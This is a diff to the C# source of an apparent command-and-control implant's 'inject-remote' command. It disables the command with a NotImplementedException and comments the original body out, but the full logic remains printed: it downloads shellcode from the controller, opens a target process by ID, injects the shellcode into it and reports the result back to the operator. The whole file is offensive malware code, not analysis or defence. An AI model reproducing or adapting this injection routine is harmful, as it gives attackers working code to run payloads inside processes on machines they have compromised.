@@ -15,43 +15,44 @@ namespace Agent.Commands
     {
         public override string Name => "inject-remote";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
-            if (task.SplittedArgs.Length < 1)
-            {
-                result.Result = $"Usage: {this.Name} ProcessId";
-                return;
-            }
+            throw new NotImplementedException();
+            //if (task.SplittedArgs.Length < 1)
+            //{
+            //    result.Result = $"Usage: {this.Name} ProcessId";
+            //    return;
+            //}
 
-            var fileName = task.FileId;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
+            //var fileName = task.FileId;
+            //var fileContent = commm.Download(task.FileId, a =>
+            //{
+            //    result.Info = $"Downloading {fileName} ({a}%)";
+            //    commm.SendResult(result);
+            //}).Result;
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
+            //this.Notify(result, commm, $"{fileName} Downloaded");
 
-            var shellcode = fileContent;
+            //var shellcode = fileContent;
 
-            int processId = int.Parse(task.SplittedArgs[0]);
+            //int processId = int.Parse(task.SplittedArgs[0]);
 
-            var process = Process.GetProcessById(processId);
-            if(process == null)
-            {
-                result.Result = $"Unable to find process with Id {processId}";
-                return;
-            }
+            //var process = Process.GetProcessById(processId);
+            //if(process == null)
+            //{
+            //    result.Result = $"Unable to find process with Id {processId}";
+            //    return;
+            //}
 
-            var injectRes = Injector.Inject(process, shellcode);
-            if (!injectRes.Succeed)
-                result.Result += $"Injection failed : {injectRes.Error}";
-            else
-            {
-                result.Result += $"Injection succeed!" + Environment.NewLine;
-                if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
-            }
+            //var injectRes = Injector.Inject(process, shellcode);
+            //if (!injectRes.Succeed)
+            //    result.Result += $"Injection failed : {injectRes.Error}";
+            //else
+            //{
+            //    result.Result += $"Injection succeed!" + Environment.NewLine;
+            //    if (!string.IsNullOrEmpty(injectRes.Output))
+            //        result.Result += injectRes.Output;
+            //}
         }
     }
 }
